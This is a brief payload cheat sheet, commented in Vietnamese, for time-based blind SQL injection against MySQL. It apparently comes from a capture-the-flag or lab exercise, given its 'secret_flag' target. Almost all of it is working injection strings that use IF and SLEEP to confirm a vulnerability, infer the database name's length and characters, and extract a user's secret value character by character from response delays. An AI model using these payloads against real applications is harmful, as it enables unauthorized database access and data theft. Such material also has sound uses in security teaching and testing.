# A. TIME-BASED BLIND SQL INJECTION
# Lợi dụng hàm SLEEP(seconds) hoặc BENCHMARK() để suy luận thông tin
# qua thời gian phản hồi (Latency) của HTTP Request.
# ----------------------------------------------------------

# 1. Kiểm tra xác nhận lỗ hổng Time-based
' AND IF(1=1, SLEEP(3), 0) -- 
' AND IF(1=2, SLEEP(3), 0) -- 

# 2. Đoán độ dài tên database
' AND IF(LENGTH(database())=8, SLEEP(3), 0) -- 

# 3. Đoán từng ký tự của database name
# Ví dụ ký tự thứ nhất = 's' (ASCII 115)
' AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0) -- 

# 4. Đoán ký tự đầu tiên của flag tài khoản admin
' AND IF(ASCII(SUBSTRING((SELECT secret_flag FROM users WHERE id=1),1,1))=70, SLEEP(3), 0) -- (70 = 'F')
